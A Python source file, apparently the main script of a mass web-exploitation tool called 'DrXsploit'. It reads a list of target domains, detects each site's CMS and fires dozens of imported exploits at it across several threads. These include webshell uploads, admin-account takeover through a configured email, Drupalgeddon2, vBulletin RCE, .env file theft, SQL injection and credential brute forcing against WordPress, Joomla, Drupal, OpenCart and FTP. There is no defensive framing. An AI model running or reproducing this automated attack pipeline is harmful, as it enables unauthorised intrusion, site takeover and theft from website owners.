YOUR_Email_For_TAkeAdmin_Exploit = 'drdataye@gmail.com'  # Edit this line with your email Address

# coding=utf-8
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'


import argparse
from concurrent.futures import ThreadPoolExecutor
import logging
import sys
import threading
import time
from core import ensure_directories_exist, read_domains_from_file, Rez
from rich.console import Console
from datetime import datetime
from tools.cms import DetectCMS
from rich.progress import Progress


# -------------- exploits ------------------


# ------------PrestaShop-----------
from exploits import Presta_1attributewizardpro
from exploits import Presta_advancedslider
from exploits import Presta_attributewizardpro
from exploits import Presta_attributewizardpro3
from exploits import Presta_attributewizardpro_x
from exploits import Presta_cartabandonmentpro
from exploits import Presta_columnadverts
from exploits import Presta_fieldvmegamenu
from exploits import Presta_homepageadvertise
from exploits import Presta_homepageadvertise2
from exploits import Presta_jro_homepageadvertise
from exploits import Presta_lib
from exploits import Presta_megamenu
from exploits import Presta_nvn_export_orders
from exploits import Presta_pk_flexmenu
from exploits import Presta_productpageadverts
from exploits import Presta_psmodthemeoptionpanel
from exploits import Presta_simpleslideshow
from exploits import Presta_soopabanners
from exploits import Presta_soopamobile
from exploits import Presta_tdpsthemeoptionpanel
from exploits import Presta_videostab
from exploits import Presta_vtermslideshow
from exploits import Presta_wdoptionpanel
from exploits import Presta_wg24themeadministration
from exploits import cartabandonmentproOld
# ------------Wordpress-------------
from exploits import cherry_plugin
from exploits import CVE_2008_3362Download_Manager
from exploits import CVE_2014_4725wysija
from exploits import CVE_2014_9735_revsliderShell
from exploits import CVE_2015_1579_revsliderConfig
from exploits import CVE_2015_4455_gravityforms
from exploits import CVE_2015_4455_gravityformsindex
from exploits import CVE_2015_5151_revsliderCSS
from exploits import CVE_2017_16562userpro
from exploits import CVE_2018_19207wp_gdpr_compliance
from exploits import CVE_2019_9879wp_graphql
from exploits import formcraft
from exploits import Headway
from exploits import pagelinesExploit
from exploits import WooCommerce_ProductAddonsExp
from exploits import WpCateGory_page_icons
from exploits import Wp_addblockblocker
from exploits import wp_barclaycart
from exploits import wp_content_injection
from exploits import wp_eshop_magic
from exploits import Wp_HD_WebPlayer
from exploits import Wp_Job_Manager
from exploits import wp_miniaudioplayer
from exploits import Wp_pagelines
from exploits import wp_support_plus_responsive_ticket_system
from exploits import wp_ungallery
from exploits import WP_User_Frontend
from exploits import viral_optinsExploit
from exploits import CVE_2019_9978SocialWarfare
from exploits import WPJekyll_Exporter
from exploits import Wp_cloudflare
from exploits import Wprealia
from exploits import Wpwoocommercesoftware
from exploits import Wp_enfold_child
from exploits import Wp_contabileads
from exploits import Wp_prh_api
from exploits import Wp_dzs_videogallery
from exploits import Wp_mmplugin
from exploits import wpinstall
from BruteForce import Wordpress
from BruteForce import FTPBruteForce
# -------------Joomla---------------
from exploits import Com_adsmanager
from exploits import Com_alberghi
from exploits import Com_CCkJseblod
from exploits import Com_extplorer
from exploits import Com_Fabric
from exploits import Com_FoxContent
from exploits import Com_b2jcontact
from exploits import Com_bt_portfolio
from exploits import Com_civicrm
from exploits import Com_jwallpapers
from exploits import Com_oziogallery
from exploits import Com_redmystic
from exploits import Com_simplephotogallery
from exploits import megamenu
from exploits import mod_simplefileuploadv1
from exploits import Com_facileforms
from exploits import Com_Hdflvplayer
from exploits import Com_Jbcatalog
from exploits import Com_JCE
from exploits import com_jdownloads
from exploits import Com_JCEindex
from exploits import Com_Joomanager
from exploits import Com_Macgallery
from exploits import com_media
from exploits import Com_Myblog
from exploits import Com_rokdownloads
from exploits import Com_s5_media_player
from exploits import Com_SexyContactform
from exploits import CVE_2015_8562RCEjoomla
from exploits import CVE_2015_8562RCEjoomla2019
from exploits import CVE_2016_9838TakeAdminJoomla
from BruteForce import Joomla

# --------------Drupal---------------
from exploits import CVE_2014_3704Drupal_add_Admin
from exploits import CVE_2018_7600Drupalgeddon2
from exploits import CVE_2019_6340Drupal8RESTful
from exploits import Drupal_mailchimp
from exploits import phpcurlclass
from BruteForce import Drupal
# --------------Oscommerce-----------
from exploits import osCommerce
# -------------opencart--------------
from BruteForce import Opencart
# --------------vBulletin-----------
from exploits import CVE_2019_16759vBulletinRCE
# --------------Unknown--------------
from exploits import CVE_2006_2529fckeditor
from exploits import phpunit
from exploits import env
from tools import Sqli

console = Console()
domains = []

def get_Typer():
    parser = argparse.ArgumentParser(description="DrXsploit", add_help=False)
    parser.add_argument("path", nargs="?", default=None, help="List For Sites")
    parser.add_argument(
        "-h", "--help", dest="help", action="store_true", help="help menu"
    )

    args = parser.parse_args()

    if args.help or not args.path:
        parser.print_help()
        sys.exit()

    logging.basicConfig(level=logging.INFO, format="%(levelname)-8s %(message)s")

    global path
    path = args.path


def banner():
    console.print(
        """

    (              )                              
    )\ )        ( /(             (             )  
    (()/(   (    )\())            )\     (   ( /(  
    /(_))  )(  ((_)\  (   `  )  ((_) (  )\  )\()) 
    (_))_  (()\ __((_) )\  /(/(   _   )\((_)(_))/  
    |   \  ((_)\ \/ /((_)((_)_\ | | ((_)(_)| |_   
    | |) || '_| >  < (_-<| '_ \)| |/ _ \| ||  _|  
    |___/ |_|  /_/\_\/__/| .__/ |_|\___/|_| \__| 
                        |_|                     
                                By [link=https://github.com/DrDataYE]@DrDataYE[/]
    """
    )
    console.print("\n-----------------\n", style="bold")
    console.print("DrDos v1.0", style="bold")
    console.print("By The [link https://github.com/DrDataYE]@DrDataYE", style="bold")
    console.print("Telegram [link https://t.me/LinuxArabe]Kali Linux", style="bold")
    console.print("By Yemen", style="bold")
    console.print("\n-----------------\n", style="bold")
    console.print(
        f"START_TIME: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}", style="bold"
    )
    console.print(f"Path: {path}", style="bold")
    console.print("\n-----------------\n", style="bold")

    with console.status("[bold green]Wait, loading functions...") as status:
        # headers()
        time.sleep(1)
        status.update("[bold green]Headers loaded, loading user agent...")
        # user_agent()
        time.sleep(1)
        status.update("[bold green]User agent loaded, loading Paths...")
        global domains
        domains = read_domains_from_file(path)
        
        time.sleep(1)
        status.update("[bold green]All functions loaded successfully!")

start_time = time.time()  # Start time of the script

# ------------------------------------------------------------------


def MultiThreadScan(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith("https://"):
            site = site.replace('https://', '')
        else:
            pass
        Check_CMs = DetectCMS(site)
        if Check_CMs == 'wordpress':
            i = CVE_2019_9978SocialWarfare.Exploit(site)
            Rez(site, i)
            i = cherry_plugin.Exploit(site)
            Rez(site, i)
            i = CVE_2008_3362Download_Manager.Exploit(site)
            Rez(site, i)
            i = CVE_2014_4725wysija.Exploit(site)
            Rez(site, i)
            i = CVE_2014_9735_revsliderShell.Exploit(site)
            Rez(site, i)
            i = CVE_2015_1579_revsliderConfig.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityformsindex.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityforms.Exploit(site)
            Rez(site, i)
            i = CVE_2015_5151_revsliderCSS.Exploit(site)
            Rez(site, i)
            i = CVE_2017_16562userpro.Exploit(site)
            Rez(site, i)
            i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = formcraft.Exploit(site)
            Rez(site, i)
            i = Wp_contabileads.Exploit(site)
            Rez(site, i)
            i = Wp_prh_api.Exploit(site)
            Rez(site, i)
            i = Wp_mmplugin.Exploit(site)
            Rez(site, i)
            i = Wp_dzs_videogallery.Exploit(site)
            Rez(site, i)
            i = Headway.Exploit(site)
            Rez(site, i)
            i = pagelinesExploit.Exploit(site)
            Rez(site, i)
            i = WooCommerce_ProductAddonsExp.Exploit(site)
            Rez(site, i)
            i = WpCateGory_page_icons.Exploit(site)
            Rez(site, i)
            i = Wp_addblockblocker.Exploit(site)
            Rez(site, i)
            i = wp_barclaycart.Exploit(site)
            Rez(site, i)
            i = wp_content_injection.Exploit(site)
            Rez(site, i)
            i = wp_eshop_magic.Exploit(site)
            Rez(site, i)
            i = WPJekyll_Exporter.Exploit(site)
            Rez(site, i)
            i = Wp_cloudflare.Exploit(site)
            Rez(site, i)
            i = Wprealia.Exploit(site)
            Rez(site, i)
            i = Wpwoocommercesoftware.Exploit(site)
            Rez(site, i)
            i = Wp_enfold_child.Exploit(site)
            Rez(site, i)
            i = Wp_HD_WebPlayer.Exploit(site)
            Rez(site, i)
            i = Wp_Job_Manager.Exploit(site)
            Rez(site, i)
            i = wp_miniaudioplayer.Exploit(site)
            Rez(site, i)
            i = Wp_pagelines.Exploit(site)
            Rez(site, i)
            i = wp_support_plus_responsive_ticket_system.Exploit(site)
            Rez(site, i)
            i = wp_ungallery.Exploit(site)
            Rez(site, i)
            i = WP_User_Frontend.Exploit(site)
            Rez(site, i)
            i = viral_optinsExploit.Exploit(site)
            Rez(site, i)
            i = wpinstall.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Wordpress')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Wordpress')
            Rez(site, i)
            mkobj = Wordpress.Wordpress()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            FTPBruteForce.Exploit(site)
        elif Check_CMs == 'joomla':
            i = CVE_2015_8562RCEjoomla.Exploit(site)
            Rez(site, i)
            i = CVE_2015_8562RCEjoomla2019.exploit(site)
            Rez(site, i)
            i = CVE_2016_9838TakeAdminJoomla.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = com_jdownloads.Exploit(site)
            Rez(site, i)
            i = Com_FoxContent.Exploit(site)
            Rez(site, i)
            i = Com_b2jcontact.Exploit(site)
            Rez(site, i)
            i = Com_bt_portfolio.Exploit(site)
            Rez(site, i)
            i = Com_civicrm.Exploit(site)
            Rez(site, i)
            i = Com_jwallpapers.Exploit(site)
            Rez(site, i)
            i = Com_oziogallery.Exploit(site)
            Rez(site, i)
            i = Com_redmystic.Exploit(site)
            Rez(site, i)
            i = Com_simplephotogallery.Exploit(site)
            Rez(site, i)
            i = megamenu.Exploit(site)
            Rez(site, i)
            i = mod_simplefileuploadv1.Exploit(site)
            Rez(site, i)
            i = Com_JCE.Exploit(site)
            Rez(site, i)
            i = Com_JCEindex.Exploit(site)
            Rez(site, i)
            i = com_media.Exploit(site)
            Rez(site, i)
            i = Com_Myblog.Exploit(site)
            Rez(site, i)
            i = Com_adsmanager.Exploit(site)
            Rez(site, i)
            i = Com_alberghi.Exploit(site)
            Rez(site, i)
            i = Com_CCkJseblod.Exploit(site)
            Rez(site, i)
            i = Com_extplorer.Exploit(site)
            Rez(site, i)
            i = Com_Fabric.Exploit(site)
            Rez(site, i)
            i = Com_facileforms.Exploit(site)
            Rez(site, i)
            i = Com_Hdflvplayer.Exploit(site)
            Rez(site, i)
            i = Com_Jbcatalog.Exploit(site)
            Rez(site, i)
            i = Com_Joomanager.Exploit(site)
            Rez(site, i)
            i = Com_Macgallery.Exploit(site)
            Rez(site, i)
            i = Com_rokdownloads.Exploit(site)
            Rez(site, i)
            i = Com_s5_media_player.Exploit(site)
            Rez(site, i)
            i = Com_SexyContactform.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Joomla')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Joomla')
            Rez(site, i)
            mkobj = Joomla.JooMLaBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'drupal':
            i = CVE_2014_3704Drupal_add_Admin.Exploit(site)
            Rez(site, i)
            i = CVE_2018_7600Drupalgeddon2.Exploit(site)
            Rez(site, i)
            i = Drupal_mailchimp.Exploit(site)
            Rez(site, i)
            i = phpcurlclass.Exploit(site)
            Rez(site, i)
            i = CVE_2019_6340Drupal8RESTful.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Drupal')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Drupal')
            Rez(site, i)
            mkobj = Drupal.DrupalBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'opencart':
            mkobj = Opencart.OpenCart()
            i = phpunit.Exploit(site, 'OpenCart')
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'OpenCart')
            Rez(site, i)
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'oscommerce':
            i = phpunit.Exploit(site, 'osCommerce')
            Rez(site, i)
            i = osCommerce.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'osCommerce')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'vBulletin':
            i = phpunit.Exploit(site, 'vBulletin')
            Rez(site, i)
            i = CVE_2019_16759vBulletinRCE.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'vBulletin')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'prestashop':
            i = Presta_1attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_advancedslider.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro3.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro_x.Exploit(site)
            Rez(site, i)
            i = Presta_cartabandonmentpro.Exploit(site)
            Rez(site, i)
            i = Presta_columnadverts.Exploit(site)
            Rez(site, i)
            i = Presta_fieldvmegamenu.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise2.Exploit(site)
            Rez(site, i)
            i = Presta_jro_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_lib.Exploit(site)
            Rez(site, i)
            i = Presta_megamenu.Exploit(site)
            Rez(site, i)
            i = Presta_nvn_export_orders.Exploit(site)
            Rez(site, i)
            i = Presta_pk_flexmenu.Exploit(site)
            Rez(site, i)
            i = Presta_productpageadverts.Exploit(site)
            Rez(site, i)
            i = Presta_psmodthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_simpleslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_soopabanners.Exploit(site)
            Rez(site, i)
            i = Presta_soopamobile.Exploit(site)
            Rez(site, i)
            i = Presta_tdpsthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_videostab.Exploit(site)
            Rez(site, i)
            i = Presta_vtermslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_wdoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_wg24themeadministration.Exploit(site)
            Rez(site, i)
            i = cartabandonmentproOld.Exploit(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'unknown':
            i = phpunit.Exploit(site, 'unknown')
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'unknown')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            i = Sqli.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'deadTarget':
            print(' {}[-] {}{} {}--> {} Timeout!{}'.format(r, w, site, c, y, w))
    except:
        print(' {}[-] {}{} {}--> {} Crashed!{}'.format(r, w, site, c, y, w))








# -------------------------------------------------------
if __name__ == "__main__":
    get_Typer()
    banner()
    ensure_directories_exist()
    try:
        with console.status(
            "[bold white]Finishing Attacks CTRL+C to stop ....."
        ) as status:
            # for site in domains:
            #     MultiThreadScan(site)
            with ThreadPoolExecutor(max_workers=5) as executor:
                results = list(executor.map(MultiThreadScan, domains))
    
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        console.print("\n\nAttack stopped by user.", style="bold")
        console.print(f"Elapsed time: {elapsed_time:.2f} seconds", style="bold")